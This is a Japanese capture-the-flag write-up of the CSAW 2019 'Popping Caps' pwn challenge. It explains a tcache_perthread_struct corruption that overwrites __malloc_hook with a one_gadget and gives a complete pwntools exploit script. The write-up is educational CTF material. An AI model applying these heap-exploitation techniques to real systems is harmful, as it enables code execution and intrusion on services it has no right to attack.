---
tags: pwn
---

# CSAW CTF 2019 Quals - Poppong Caps

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/osirislab/CSAW-CTF-2019-Quals>

## Writeup

### Outline

systemのアドレスをくれるので最初からlibc leakがされている、やったぜ。というわけでhook系の書き換えだけでクリアできる。
コマンドはcreate(mallocのみ), edit, deleteの3つ。libc leakが不要なのでshowは無い。
freeは何故かインデックスでは無く確保した領域からの距離を指定してfree出来るので実質任意アドレスをfree出来る。
7回のコマンドでクリアしなくてはならずcreate+editにあたる操作が無いのでDouble Freeしてtcache poisoningでは回数制限に到達する。
じゃあUAFと言いたいところだがdelete時とedit時には扱うポインタを入れてる変数が違っており、しかもfreeした際にeditで使うポインタはクリアされるのでUAFは出来ない。
というわけで[redpwnCTF 2020 - four function heap](/eFJwsVn3R_uH3KWwVftX2A)でも回数削減テクニックで使ったtcache_perthread_entryの書き換えをする。
最後に何故か`malloc(0x38)`が呼ばれているので`__malloc_hook`を書き換える

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

outlineでだいたい書いた通り、最初にsystemのアドレスをくれるのでlibc leakはしなくて良い。
コマンドは次の3つ、全て合わせて7回しか使えない

1. malloc: サイズを指定してmallocする。2つポインタ用の変数がありそれらにポインタが代入される。便宜上このポインタ達を`p1, p2`とおく
2. free: `free((long)p1 + idx)`する。したがって実質任意アドレスをfreeできる。
(ほとんど確実に満たしているが)`p1 == p2`なら`p2 = 0`にする。
3. write: `read(0, p2, 8)`する

何故か最後に`malloc(0x38)`が呼ばれている

### 回数制限

最後に`malloc`が呼ばれているので`__malloc_hook`の書き換えということは想像が付く。まず考えられるのはいつもどおりDouble Freeを利用したtcache poisoningだが今回はcreate+editに当たるコマンドが無いので`create -> delete -> delete -> create -> edit -> create -> create -> edit`と8回必要になってしまう。これではもちろん制限を超過するので使えない。

### `mchunk_size`を作る

さて、今回の問題では最初にmallocして確保したポインタ`p1`からの位置がわかるアドレスならどこでもfreeできる。但し、チャンクに`mchunk_size`メンバが無いと死ぬのでそれを作らなくてはならない。
malloc+writeで`mchunk_size`を作ったところで意味のあるチャンクは作れそうに無いしコマンドの無駄使いである。ではどこに用意するかというと`tcache_perthread_struct`である。ここの定義や悪用の仕方は[redpwnCTF 2020 - four function heap](/eFJwsVn3R_uH3KWwVftX2A)を参照して頂くとして、tcacheの管理領域であることから次にどのサイズのmallocでどのアドレスを取るかを決める事ができる。よって、そこに該当する箇所をチャンクとして確保すれば良い。
素のままでは特にfree出来る箇所は無いが、カウンタ部分を適当に立てれば次のようなメモリ配置になってentries[0]部分をfreeすればサイズ0x100のチャンクとしてポインタを入手することが出来る。

```
counts       : 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00
counts + 0x10: 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00
counts + 0x20: 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00
counts + 0x30: 00 00 00 00 00 00 00 00 | 00 01 00 00 00 00 00 00
entries      : ...
```

ここでサイズ部分は`counts[i]`に対応することから何らかのサイズのチャンクを確保してfreeするとここのカウンタが1増えてこのようなメモリにすることが出来る。今回はチャンクサイズにして0x3b0のチャンクを一旦tcacheに送ればカウンタが増えるので`malloc(0x3a8)`を発動させる。

### 次の確保先を操作する

`tcache_perthread_struct`の一部をチャンクとして確保出来る見込みがついたので実際にここをfreeする。deleteコマンドが`p1`からの位置さえ判明していればどこでもfree出来るので`p1 - 0x210`であるここをfreeする。
すると0x100のtcacheにこの部分が入ることから次に`malloc(0xf8)`等を発動させるとここが確保される。
ここで8バイトだけ書き込みが出来るので書き込みを行うと`entries[0]`に当たる部分に書き込みが出来る。ということはここでもしどこかのアドレスを書き込めば次に`malloc(0x18)`のようなサイズ0x20のチャンクを確保出来るようなmallocを発動させると得られるポインタはそこを指すようになる。したがってここに`__malloc_hook`のアドレスを書き込んでwriteを行えば無事に`__malloc_hook`にアドレスを仕込むことが出来る。

## Code

```python
from pwn import *


def select(s, sel, c=b"choice: "):
    s.recvuntil(c)
    s.sendline(str(sel))


def malloc(s, size):
    select(s, 1)
    s.recvuntil(b"How many: ")
    s.sendline(str(size))


def delete(s, idx=0):
    select(s, 2)
    s.recvuntil(b"free: ")
    s.sendline(str(idx))


def write(s, data):
    select(s, 3)
    s.recvuntil(b"in: ")
    s.send(data)


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    No RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    elf = ELF("./popping_caps")
    malloc_got = elf.got["malloc"]
    libc = ELF("./libc.so.6")
    arena_libc = 0x3ebc40
    system_libc = libc.symbols["system"]
    malloc_hook_libc = libc.symbols["__malloc_hook"]
    one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]

    s = process("./popping_caps")
    s.recvuntil(b"system ")
    libc_addr = int(s.recvline().rstrip(), 16) - system_libc
    print(hex(libc_addr))
    malloc(s, 0x3a8)
    delete(s)
    delete(s, -(0x210))
    malloc(s, 0xf8)
    write(s, p64(libc_addr + malloc_hook_libc))
    malloc(s, 0x18)
    write(s, p64(libc_addr + one_gadget[2]))

    s.interactive()

```

## Flag

ローカルでシェル取っただけなのでないです

## 感想

せっかくなので最近使ったtcache_perthread_structを初めて知ったきっかけになった問題を解いてみた。No RELRO(Pertial RELROより弱い)だったりしたのでもしかしたら別解があるのかもしれないが結局思い付かなかった(公式Writeupは`p1`からの距離を全探索してfreeの際にエラーを起こさない場所を探索していた、脳筋かよ)